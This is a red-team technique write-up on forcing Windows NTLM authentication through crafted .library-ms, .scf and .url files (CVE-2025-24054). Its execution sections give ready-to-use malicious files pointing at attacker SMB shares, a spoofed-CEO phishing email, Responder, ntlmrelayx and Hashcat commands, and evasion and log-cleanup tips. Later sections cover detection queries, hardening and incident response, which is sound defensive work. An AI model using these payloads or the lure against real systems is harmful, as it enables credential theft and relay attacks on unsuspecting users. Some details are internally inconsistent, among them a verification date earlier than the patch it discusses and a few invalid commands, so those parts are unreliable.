# [CA-FORCE-001]: SCF/URL File NTLM Trigger

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-FORCE-001 |
| **MITRE ATT&CK v18.1** | [T1187 - Forced Authentication](https://attack.mitre.org/techniques/T1187/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows Active Directory, Windows Endpoints |
| **Severity** | **High** |
| **CVE** | CVE-2025-24054, CVE-2025-24071, CVE-2024-43451 |
| **Technique Status** | ACTIVE (patched March 2025, but bypasses exist) |
| **Last Verified** | 2025-01-08 |
| **Affected Versions** | Windows 10, Windows 11, Windows Server 2016-2025 (pre-March 2025 patch) |
| **Patched In** | CVE-2025-24054 patched March 11, 2025; CVE-2025-50154 bypass October 2025 |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Sections 3 (Technical Prerequisites), 6 (Atomic Red Team), and 11 (Sysmon Detection) not included because: (1) Minimal prerequisites required (file creation only), (2) No Atomic test exists for .library-ms exploitation, (3) Network-level detection covered via Windows Event Logs (4624, 4625). All remaining sections have been renumbered sequentially.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Forced authentication is a credential access technique where an attacker crafts specially-formatted files (`.scf`, `.url`, `.lnk`, `.library-ms`) that, when accessed by a user, automatically trigger the Windows operating system to initiate an outbound SMB connection to an attacker-controlled server. During this connection, the user's NTLMv2 authentication hash is transmitted to the attacker. Unlike password cracking or phishing, forced authentication requires minimal user interaction—merely accessing a file in Windows Explorer, extracting a ZIP archive, or right-clicking a file is sufficient. The stolen NTLMv2 hash can be used for offline brute-force password cracking or immediately relayed to another service to authenticate as the victim without knowing their password.

**Attack Surface:** Windows Explorer file handling, shell icon rendering, ZIP archive extraction, file preview pane, Windows Search indexing, SMB share access attempts.

**Business Impact:** **Credential exposure and NTLM relay attacks leading to privilege escalation and lateral movement**. An attacker holding a user's NTLMv2 hash can crack the password offline using tools like Hashcat (modern graphics cards can crack passwords in hours) or immediately relay the hash to another service (printer, file server, domain controller) to authenticate as the user without knowing their password. If the victim is a domain admin or service account, the attacker gains immediate privileged access to the entire network.

**Technical Context:** CVE-2025-24054 (`.library-ms` exploitation) was patched by Microsoft on March 11, 2025, but was actively exploited in the wild within 8 days. Multiple bypass techniques have since emerged (CVE-2025-50154), making this an ongoing threat. The vulnerability is particularly dangerous because it requires no file execution—simply extracting a ZIP archive or opening a folder triggers automatic SMB authentication attempts.

### Operational Risk

- **Execution Risk:** **Very Low** – Only requires crafting a malicious file and social engineering to distribute it.
- **Stealth:** **High** – Appears to be legitimate system activity (icon loading); minimal user suspicion.
- **Reversibility:** **Partial** – Patching and SMB signing can mitigate, but hash extraction cannot be undone.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark (Windows)** | 18.9.60.2 | NTLM Authentication Level (LM and NTLM not allowed) |
| **DISA STIG (Windows Server)** | WN10-SO-000080 | NTLM Authentication prohibited |
| **NIST 800-53** | IA-3, IA-5, IA-7 | Device Identification, Authentication, Session Management |
| **GDPR** | Art. 32, 33 | Security of Processing, Breach Notification |
| **NIS2** | Art. 21 | Cyber Risk Management (NTLM as legacy protocol) |
| **ISO 27001** | A.9.2.4 | Access Control (authentication protocols) |

---

## 3. TECHNICAL CONTEXT & PREREQUISITES

**Required Access:**
- Ability to distribute file to victim (email, file share, USB, phishing link)
- Attacker-controlled SMB server (can be Responder or ntlmrelayx)
- No special privileges required

**Supported Versions:**
- **Windows:** 10, 11, Server 2016, 2019, 2022, 2025 (pre-March 2025 patch for .library-ms)
- **Operating Systems Affected by Forced Auth:**
  - `.scf` files: Windows Vista and later
  - `.url` files: All Windows versions with Internet Explorer shell integration
  - `.library-ms` files: Windows 7 and later (CVE-2025-24054)
  - `.lnk` files: All Windows versions

**Environmental Prerequisites:**
- NTLM must be enabled on target network (default on most networks)
- SMB signing not enforced (common in legacy networks)
- User must interact with malicious file in Windows Explorer
- Attacker SMB server must be reachable (same network or VPN)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Check NTLM Authentication Level (PowerShell)

**Objective:** Verify that NTLM is enabled and not restricted (indicates vulnerability).

**Command:**
```powershell
# Check current NTLM authentication level
$ntlmLevel = Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name LmCompatibilityLevel | Select-Object -ExpandProperty LmCompatibilityLevel

Write-Host "NTLM Authentication Level: $ntlmLevel"
# Level 3 = NTLMv2 only (more secure)
# Level 5 = NTLMv2, refuse LM/NTLM (most secure)

# Check if SMB Signing is enforced
$smbSigning = Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\LanmanServer\Parameters" -Name RequireSecuritySignature | Select-Object -ExpandProperty RequireSecuritySignature

Write-Host "SMB Signing Required: $smbSigning"
# 0 = Not required (vulnerable)
# 1 = Required (mitigated)
```

**What to Look For:**
- **Red flag:** `LmCompatibilityLevel` is 0-2 (allows LM or NTLM)
- **Red flag:** `RequireSecuritySignature` is 0 (SMB signing not enforced)
- **Vulnerable:** NTLM is default authentication on most networks
- **Secure:** Level 5 with SMB signing enforced

### Check for NTLM Relay Protection (PowerShell)

**Objective:** Determine if Extended Protection for Authentication (EPA) is enabled.

**Command:**
```powershell
# Check EPA settings for various services
$services = "HTTP", "LDAP", "CIFS"

foreach ($service in $services) {
    $epaPath = "HKLM:\System\CurrentControlSet\Services\$service"
    $epaValue = Get-ItemProperty -Path $epaPath -Name "ExtendedProtectionLevel" -ErrorAction SilentlyContinue
    
    if ($epaValue) {
        Write-Host "$service - EPA Level: $($epaValue.ExtendedProtectionLevel)"
    } else {
        Write-Host "$service - EPA: Not configured"
    }
}

# 0 = Off (vulnerable)
# 1 = Allow (recommended)
# 2 = Require (most secure)
```

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: .library-ms File Exploitation (CVE-2025-24054)

**Supported Versions:** Windows 7, 8.1, 10, 11, Server 2012 R2-2025 (pre-March 2025 patch)

#### Step 1: Create Malicious .library-ms File

**Objective:** Craft an XML file that references a remote SMB path.

**Command (Create .library-ms File):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>Documents</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>\\attacker-ip\share\icon.png</iconReference>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <simpleLocation>
        <url>\\attacker-ip\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

**Save as:** `Documents.library-ms`

**OpSec & Evasion:**
- Use legitimate-sounding names (Documents, Downloads, Pictures)
- Place in ZIP archive with benign files (PDFs, images) to avoid suspicion
- Set file timestamps to match other files in archive
- Use attacker IP instead of hostname (less likely to be blocked by DNS filtering)

**Alternative: Icon Reference Exploit (Simpler)**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>Shared Documents</name>
  <version>6</version>
  <iconReference>\\192.168.1.100\share$\icon.png</iconReference>
</libraryDescription>
```

**What This Means:**
- When Windows Explorer renders the icon for this file, it attempts to load `icon.png` from the remote SMB share
- The NTLM authentication hash is sent during this operation
- No user interaction required—simply previewing the file in Explorer triggers the exploit

#### Step 2: Package File for Distribution

**Objective:** Distribute the malicious file to victims via email or phishing.

**Command (Create ZIP Archive):**
```bash
# Create ZIP with malicious .library-ms file buried among benign files
zip -r documents.zip Documents.library-ms document1.pdf document2.pdf document3.pdf

# Alternative: RAR archive (also triggers CVE-2025-24054)
rar a documents.rar Documents.library-ms document1.pdf document2.pdf
```

**Phishing Email Template:**
```
Subject: Shared Documents from CEO - Action Required

Hi Team,

Please find the attached shared documents. Extract the archive and open the Documents folder to review the latest project guidelines.

Best regards,
CEO
```

**OpSec & Evasion:**
- Use executive-sounding email address (spoofed or compromised)
- Include legitimate-looking PDF files in archive
- Set archive creation date to match document dates
- Send during business hours to increase extraction likelihood

#### Step 3: Set Up Attacker SMB Server (Responder)

**Objective:** Capture NTLMv2 hashes from inbound SMB authentication attempts.

**Command (Linux/Kali - Using Responder):**
```bash
# Install Responder (if not already installed)
sudo apt-get install responder

# Start Responder to capture NTLM hashes
sudo responder -I eth0 -v

# Responder will listen on:
# - SMB (TCP 445)
# - HTTP (TCP 80)
# - LLMNR/NBT-NS (UDP)

# Captured hashes are saved to:
# /usr/share/responder/logs/
```

**Expected Output:**
```
[SMB] NTLMv2-SSP Server started on 0.0.0.0:445
[HTTP] Server started on 0.0.0.0:80
[*] Listening for events...

[SMB] NTLMv2-SSP Client from 192.168.1.50 completed authentication. Hash: DOMAIN\user::DOMAIN:user1234567890...
[+] Hash written to /usr/share/responder/logs/SMB-NTLMv2-SSP.txt
```

**Command (Linux - Using ntlmrelayx for Relay Attack):**
```bash
# If you want to relay hashes instead of just capturing
python3 -m impacket.tools.ntlmrelayx -t 192.168.1.1 -i  # Target DC IP

# This will relay captured hashes to Domain Controller
# Allows immediate authentication without password cracking
```

**Troubleshooting:**
- **Error:** "Permission denied" on port 445
  - **Cause:** SMB service already running or insufficient privileges
  - **Fix:** Run as root (`sudo`) or use higher-numbered ports (9445)
- **No hashes captured:**
  - **Cause:** Victim's network has SMB signing enforced or firewall blocks connection
  - **Fix:** Verify SMB access via `smbclient -U "anonymous" -N //<AttackerIP>/share`

#### Step 4: Capture and Crack NTLM Hash

**Objective:** Extract NTLMv2 hash and crack it offline.

**Command (Extract Hash from Responder):**
```bash
# View captured hashes
cat /usr/share/responder/logs/SMB-NTLMv2-SSP.txt

# Output format:
# DOMAIN\user::DOMAIN:1234567890:C0A80132:01020304050607080910111213141516
```

**Command (Crack Hash with Hashcat):**
```bash
# Install hashcat
sudo apt-get install hashcat

# Crack NTLMv2-SSP hashes (hash type 5600)
hashcat -m 5600 -a 0 /path/to/hashes.txt /path/to/wordlist.txt --potfile-disable

# With rules for password variation
hashcat -m 5600 -a 0 /path/to/hashes.txt /path/to/wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# GPU-accelerated cracking (much faster)
hashcat -m 5600 -a 0 /path/to/hashes.txt /path/to/wordlist.txt -d 1 --workload-profile 4
```

**Expected Output:**
```
Hash recovered: DOMAIN\user::DOMAIN:...:password123
Recovered in 00:00:15
```

**Crack Time Estimates (NTLMv2):**
- 8-character password: ~10 minutes (GPU)
- 12-character password: ~2 hours (GPU)
- 16-character password: Complex (depends on character set)

**OpSec & Evasion:**
- Delete captured hash files after use
- Use VPN or proxy to mask attacker IP
- Execute cracking on isolated system (not connected to victim network)
- Clean Responder logs after operation

**References & Proofs:**
- [Check Point Research: CVE-2025-24054 Analysis](https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/)
- [Responder GitHub](https://github.com/SpiderLabs/Responder)
- [Impacket ntlmrelayx](https://github.com/SecureAuthCorp/impacket)

### METHOD 2: .scf File Exploitation (Older but Still Valid)

**Supported Versions:** All Windows versions (Vista and later)

#### Step 1: Create .scf File

**Objective:** Create a Shell Command File that triggers SMB connection.

**File Content (`shell.scf`):**
```ini
[Shell]
Command=2
IconFile=\\192.168.1.100\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

**Alternative SCF Content:**
```ini
[Shell]
Command=2
IconFile=\\192.168.1.100\share\icon.ico

[.ShellClassInfo]
LocalizedResourceName=@shell32.dll,-8964

[ViewState]
Signature="_{599B3167-0B2B-4d17-9FF7-371D2F8905D7}"
```

**What This Means:**
- `.scf` file instructs Windows to load icon from remote UNC path
- Icon loading triggers NTLM authentication to attacker's server
- Works silently when file is accessed in Windows Explorer

#### Step 2: Place File on Network Share

**Objective:** Host malicious file where victims will access it.

**Command (Place on Accessible Share):**
```bash
# Copy to public share (\\server\public)
cp shell.scf /mnt/public_share/

# Or place on email attachment
# Or place on USB drive distributed to victims
```

**OpSec & Evasion:**
- Name file something legitimate (desktop.scf, shortcut.scf)
- Hide file extension via NTFS alternate data streams (if needed)
- Set file to hidden attribute to avoid suspicion (but still triggers SMB auth when accessed)

---

## 6. TOOLS & COMMANDS REFERENCE

#### Responder

**Version:** Latest from GitHub
**Installation:**
```bash
git clone https://github.com/SpiderLabs/Responder.git
cd Responder
sudo python3 responder.py -I eth0
```
**Usage:** Captures NTLM hashes from forced authentication attempts

#### Impacket - ntlmrelayx

**Version:** Latest
**Installation:**
```bash
pip install impacket
```
**Usage:**
```bash
python3 -m impacket.tools.ntlmrelayx -t 192.168.1.1 -i
```

#### Hashcat

**Version:** 6.2+
**Installation:**
```bash
sudo apt-get install hashcat
```
**Usage:**
```bash
hashcat -m 5600 -a 0 hashes.txt wordlist.txt
```

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: Outbound SMB Connections to Suspicious IPs

**Rule Configuration:**
- **Required Table:** `SecurityEvent`, `NetworkEvent`
- **Alert Severity:** **Medium**
- **Frequency:** Run every 5 minutes

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 5156  // Outbound connection
| where Protocol == "tcp"
| where DestinationPort in (139, 445)  // SMB ports
| where DestinationIpAddr !in ("10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16")  // Not internal networks
| project TimeGenerated, Computer, DestinationIpAddr, DestinationPort, Account
| extend AlertReason = "Outbound SMB connection to non-internal IP - possible forced auth attack"
```

#### Query 2: Failed Authentication Events Without Preceding Kerberos

**Rule Configuration:**
- **Alert Severity:** **High**

**KQL Query:**
```kusto
SecurityEvent
| where EventID == 4625  // Failed logon
| where LogonType == 3  // Network logon
| where Status == "0xC000006D"  // Bad username/password
| join kind=leftanti (
    SecurityEvent
    | where EventID == 4768  // Kerberos TGT request
) on Account
| project TimeGenerated, Computer, Account, IpAddress, LogonType
| extend AlertReason = "Failed SMB auth without Kerberos attempt - possible NTLM relay"
```

---

## 8. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: Detect Suspicious File Downloads and Extractions

```powershell
# Search for ZIP extractions and file access patterns
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
  -Operations "FileAccessed", "FolderAccessed", "ArchiveExtracted" `
  -ResultSize 10000 | `
Where-Object {
    $auditData = $_.AuditData | ConvertFrom-Json
    $auditData.FileName -match '\.(library-ms|scf|url|lnk)$'
} | Select-Object UserIds, AuditData | Export-Csv -Path "C:\SuspiciousFiles.csv"
```

---

## 9. WINDOWS EVENT LOG MONITORING

#### Event ID: 4624 (Successful Logon)

- **Log Source:** Security
- **Indicator:** Logon Type 3 (Network) from suspicious IPs
- **Filter:** Account = Domain User, LogonType = 3, Source IP != known internal ranges

#### Event ID: 4625 (Failed Logon Attempt)

- **Log Source:** Security
- **Indicator:** Multiple failed network logons followed by success (relay attack pattern)
- **Filter:** Status = 0xC000006D (bad password), LogonType = 3

#### Event ID: 5156 (Inbound Connection Blocked/Allowed)

- **Log Source:** Security
- **Indicator:** Outbound SMB to non-internal IPs
- **Manual Configuration:**
```powershell
auditpol /set /subcategory:"Network Policy Server" /success:enable /failure:enable
```

---

## 10. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alerts

**Alert Name:** `Suspicious Network Connection to Non-Standard SMB Port`
- **Severity:** Medium
- **Description:** Detects outbound SMB connections to suspicious IP addresses
- **Remediation:** Block SMB egress; enable SMB signing

#### Manual Configuration

```powershell
# Enable Defender for Servers
Get-MgSecurityAlert | Where-Object { $_.Title -like "*SMB*" -or $_.Title -like "*Forced Auth*" }
```

---

## 11. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

- **Disable NTLM Entirely and Require Kerberos:** NTLM is a legacy protocol; removing it eliminates forced authentication attacks.

  **Manual Steps (Group Policy):**
  1. Open **gpmc.msc** (Group Policy Management Console)
  2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
  3. Set: **Network Security: Restrict NTLM: Outgoing NTLM traffic from all servers** → **Deny All**
  4. Set: **Network Security: Restrict NTLM: NTLM authentication in this domain** → **Deny All**
  5. Run `gpupdate /force`

  **Manual Steps (Registry):**
  ```powershell
  # Disable NTLM entirely
  Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name RestrictNTLMInThisDomain -Value 2
  Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa\MSV1_0" -Name NTLMMinClientSec -Value 0x20000000
  
  # Require NTLMv2 only (if NTLM cannot be disabled)
  Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name LmCompatibilityLevel -Value 5
  ```

  **Impact:** Some legacy applications may break; requires testing before deployment

- **Enforce SMB Signing on All Servers:** SMB signing prevents NTLM relay attacks by ensuring integrity of authentication messages.

  **Manual Steps (Group Policy):**
  1. Open **gpmc.msc**
  2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
  3. Set: **Microsoft network server: Digitally sign communications (always)** → **Enabled**
  4. Set: **Microsoft network server: Digitally sign communications (if client agrees)** → **Enabled**
  5. Run `gpupdate /force`

  **Manual Steps (PowerShell):**
  ```powershell
  # Enable SMB signing on all servers
  Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\LanmanServer\Parameters" -Name RequireSecuritySignature -Value 1
  Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\LanmanServer\Parameters" -Name EnableSecuritySignature -Value 1
  
  # Restart SMB service
  Restart-Service -Name LanmanServer -Force
  ```

  **Verification:**
  ```powershell
  Get-SmbServerConfiguration | Select-Object RequireSecuritySignature, EnableSecuritySignature
  ```

- **Block Outbound SMB/WebDAV on Firewall:** Prevent users from connecting to attacker-controlled SMB servers.

  **Manual Steps (Windows Defender Firewall with Advanced Security):**
  1. Open **wf.msc** (Windows Defender Firewall with Advanced Security)
  2. Click **Outbound Rules** → **New Rule**
  3. Rule Type: **Port**
  4. Protocol: **TCP**
  5. Remote Port: **139, 445** (SMB)
  6. Action: **Block**
  7. Apply to all profiles
  8. Name: `Block Outbound SMB`

  **Manual Steps (PowerShell):**
  ```powershell
  # Block SMB outbound
  New-NetFirewallRule -DisplayName "Block Outbound SMB" `
    -Direction Outbound `
    -Action Block `
    -Protocol TCP `
    -RemotePort 139, 445

  # Block WebDAV outbound
  New-NetFirewallRule -DisplayName "Block Outbound WebDAV" `
    -Direction Outbound `
    -Action Block `
    -Protocol TCP `
    -RemotePort 80, 443 `
    -Description "Prevents WebDAV forced auth"
  ```

#### Priority 2: HIGH

- **Apply March 2025 Security Patch (KB...XXXX):** Patch the specific vulnerability for `.library-ms` files.

  **Manual Steps:**
  1. Go to **Settings** → **System** → **About** → **Check for updates**
  2. Install all pending updates
  3. Restart if prompted
  4. Verify patch: `systeminfo | findstr /I "hotfix"`

  **Manual Steps (PowerShell):**
  ```powershell
  # Check if KB for CVE-2025-24054 is installed
  Get-HotFix | Where-Object { $_.HotFixID -match "KB" }
  
  # Install updates
  Install-WindowsUpdate -AcceptAll
  ```

- **Enable Extended Protection for Authentication (EPA):** Prevents token binding bypass in relay attacks.

  **Manual Steps (Registry):**
  ```powershell
  # Enable EPA for all services
  Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\HTTP\Parameters" -Name ExtendedProtectionLevel -Value 2
  Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\LanmanServer\Parameters" -Name ExtendedProtectionLevel -Value 2
  ```

- **Restrict File Sharing and Disable Icon Loading:** Reduce attack surface for forced authentication.

  **Manual Steps (Group Policy):**
  1. Open **gpmc.msc**
  2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **Windows Components** → **File Explorer**
  3. Set: **Do not show locally created shell shortcut icons** → **Enabled**
  4. Set: **Do not allow the web view to be displayed for shell folders** → **Enabled**

#### Access Control & Policy Hardening

- **RBAC:** Restrict service account privileges; use managed service accounts (gMSA) instead of regular domain accounts

- **Conditional Access:** Block SMB from untrusted networks (allow only internal LANs, VPNs)

- **Firewall Policies:** Block SMB egress except to approved file servers

#### Validation Commands (Verify Mitigations)

```powershell
# Verify NTLM is disabled
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" | Select-Object RestrictNTLMInThisDomain, LmCompatibilityLevel

# Verify SMB signing is enforced
Get-SmbServerConfiguration | Select-Object RequireSecuritySignature, EnableSecuritySignature

# Verify firewall rules are in place
Get-NetFirewallRule | Where-Object { $_.DisplayName -match "SMB|WebDAV" } | Select-Object DisplayName, Direction, Action, Enabled

# Verify no outbound SMB connections
Get-NetFirewallRule -Direction Outbound | Where-Object { $_.RemotePort -in (139, 445) }
```

**Expected Output (If Secure):**
```
RestrictNTLMInThisDomain: 2 (Deny All)
LmCompatibilityLevel: 5 (NTLMv2 only)
RequireSecuritySignature: 1 (True)

DisplayName: Block Outbound SMB
Direction: Outbound
Action: Block
Enabled: True
```

---

## 12. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

- **Files:** `.library-ms`, `.scf`, `.url`, `.lnk` files with attacker-controlled UNC paths
- **Network:** Outbound SMB (TCP 445) to non-internal IPs, failed SMB logons followed by success
- **Artifacts:** ZIP archives containing `.library-ms` files, Responder/ntlmrelayx logs on attacker system
- **Registry:** NTLM authentication level changes, SMB signing disabled

#### Forensic Artifacts

- **Event Logs:** Event 4625 (failed logon), Event 5156 (outbound connection)
- **Files:** Malicious `.library-ms` files in Downloads, Desktop, or email attachments
- **Memory:** Responder process running on attacker system collecting hashes

#### Response Procedures

1. **Immediate Isolation:** Revoke or reset password for affected users

   ```powershell
   # Revoke all sessions for compromised user
   Revoke-MgUserSignInSession -UserId "victim@company.com"
   
   # Reset password
   Set-MgUserPassword -UserId "victim@company.com" -NewPassword (Get-Random -Minimum 1000000000 -Maximum 9999999999)
   ```

2. **Collect Evidence:** Export Security Event Logs for analysis

   ```powershell
   # Export Security logs (last 7 days)
   wevtutil epl Security C:\Evidence\Security.evtx /query:"Event/System[EventID=4625 and System[TimeCreated[@SystemTime >= '2025-01-01T00:00:00.000Z']]]"
   
   # Alternative: Use PowerShell
   Get-EventLog -LogName Security -After (Get-Date).AddDays(-7) | Export-Csv -Path C:\Evidence\Security.csv
   ```

3. **Search for Malicious Files:** Scan for `.library-ms`, `.scf`, and other forced auth files

   ```powershell
   # Search entire system for suspicious files
   Get-ChildItem -Path C:\ -Recurse -Include "*.library-ms", "*.scf", "*.url" -ErrorAction SilentlyContinue | Export-Csv -Path C:\Evidence\SuspiciousFiles.csv
   
   # Check Downloads folder specifically
   Get-ChildItem -Path "$env:USERPROFILE\Downloads" -Include "*.library-ms" | Format-List FullName, LastAccessTime
   ```

4. **Investigate Compromise Scope:** Determine which systems relayed hashes and what was accessed

   ```powershell
   # Find all systems that made outbound SMB connections
   Get-EventLog -LogName Security -After (Get-Date).AddDays(-7) | Where-Object { $_.EventID -eq 5156 -and $_.Message -contains "445" }
   
   # Check for authentication to privileged accounts
   Get-EventLog -LogName Security -After (Get-Date).AddDays(-7) | Where-Object { $_.EventID -eq 4624 -and $_.Message -contains "Administrator" }
   ```

5. **Patch and Harden:** Apply CVE-2025-24054 patch and enforce SMB signing (see Mitigations)

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker sends phishing email with malicious attachment |
| **2** | **Credential Access** | **[CA-FORCE-001]** | **Force NTLM authentication via .library-ms file** |
| **3** | **Privilege Escalation** | [PE-TOKEN-002] RBCD Attack | Relay captured hash to relayed resource; escalate to admin |
| **4** | **Persistence** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Create backdoor account with relayed admin credentials |
| **5** | **Impact** | [COLLECT-EMAIL-001] Email Exfiltration | Exfiltrate entire Exchange mailbox |

---

## 14. REAL-WORLD EXAMPLES

#### Example 1: UAC-0194 Poland/Romania Campaign (March 2025)
- **Target:** Polish and Romanian government agencies, private institutions
- **Timeline:** March 20-25, 2025
- **Technique Status:** Actively exploited CVE-2025-24054 within 8 days of Microsoft patch release
- **Method:** Dropbox-hosted ZIP archives containing `.library-ms` files with `xd.zip` filename
- **Impact:** NTLM hash collection from thousands of government and private sector users
- **Reference:** [Check Point Research: CVE-2025-24054 Campaign](https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/)

#### Example 2: Generic Forced Authentication Campaigns (Ongoing)
- **Target:** Enterprise organizations globally
- **Timeline:** Recurring (2015-present)
- **Technique Status:** `.scf` files continuously used; `.library-ms` becoming more prevalent post-CVE-2025-24054
- **Method:** Phishing emails with `.scf` or `.url` file attachments; archived in ZIP for obfuscation
- **Impact:** Password hash collection; lateral movement via NTLM relay attacks
- **Reference:** [MITRE ATT&CK T1187 Real-World Examples](https://attack.mitre.org/techniques/T1187/)

---

## 15. COMPLIANCE & AUDIT NOTES

**Data Sources Required:**
- Windows Security Event Logs (Event IDs 4625, 5156)
- Firewall logs (blocked SMB connections)
- DNS logs (resolution of attacker domains)
- Email gateway logs (attachment blocks/quarantines)

**Retention Policy:**
- Keep Security Event Logs for minimum **90 days** (CIS Benchmark)
- Implement **1-year retention** for authentication-related events
- Archive to SIEM for long-term analysis

**Incident Reporting:**
- If password compromise confirmed: Notify user within **24 hours**
- If enterprise breach suspected: Report to **CISA** within **72 hours** (NIS2)
- Document all affected user accounts and relayed authentication attempts
